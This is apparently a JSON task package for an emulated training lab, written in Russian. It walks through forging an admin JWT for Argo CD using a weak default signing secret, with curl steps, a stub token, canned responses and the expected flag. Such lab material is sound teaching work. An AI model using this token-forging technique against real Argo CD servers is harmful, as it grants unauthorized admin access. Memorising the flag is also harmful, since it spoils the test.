{
  "id": "web-argocd",
  "workdir": "/home/student/task",
  "hostname": "lab",
  "expect": {
    "file": "/home/student/task/found.txt",
    "contains": "nto{4rg0cd_w34k_jwt_f0rg3_adm1n}"
  },
  "fs": [
    {
      "path": "/home/student/task",
      "type": "dir"
    },
    {
      "path": "/home/student/task/task.md",
      "text": "# Практика: Argo CD подделка JWT\n\nЦель: `https://argocd.local`.\n\n1. Версия:\n   curl -s -k https://argocd.local/api/version\n\n2. Проверь анонимный доступ:\n   curl -s -k https://argocd.local/api/v1/applications\n\n3. Секрет подписи слабый (дефолтный). Подпиши JWT с role:admin\n   (готовый токен уже в файле token.txt) и обратись к API:\n   curl -s -k https://argocd.local/api/v1/applications -H 'Authorization: Bearer TOKEN'\n\n4. В ответе — флаг. Сохрани в found.txt и набери `check`.\n"
    },
    {
      "path": "/home/student/task/token.txt",
      "text": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.<forged-with-default-secret>\n"
    }
  ],
  "tools": {
    "curl": {
      "help": "curl [опции] <url> — HTTP-клиент (эмуляция argocd.local)",
      "cases": [
        {
          "match": "Bearer|token\\.txt",
          "example": "-s -k https://argocd.local/api/v1/applications -H 'Authorization: Bearer ...'",
          "output": "{\"items\":[{\"metadata\":{\"name\":\"app\"},{\"secret\":\"nto{4rg0cd_w34k_jwt_f0rg3_adm1n}\"}}]}\n"
        },
        {
          "match": "api/v1/applications",
          "example": "-s -k -o /dev/null -w \"%{http_code}\" https://argocd.local/api/v1/applications",
          "output": "401\n"
        },
        {
          "match": "api/version",
          "example": "-s -k https://argocd.local/api/version",
          "output": "{\"Version\":\"v2.2.0\",\"BuildDate\":\"2021-11-01T00:00:00Z\"}\n"
        }
      ],
      "fallback": "curl: в этой лабе эмулируется только argocd.local"
    }
  }
}
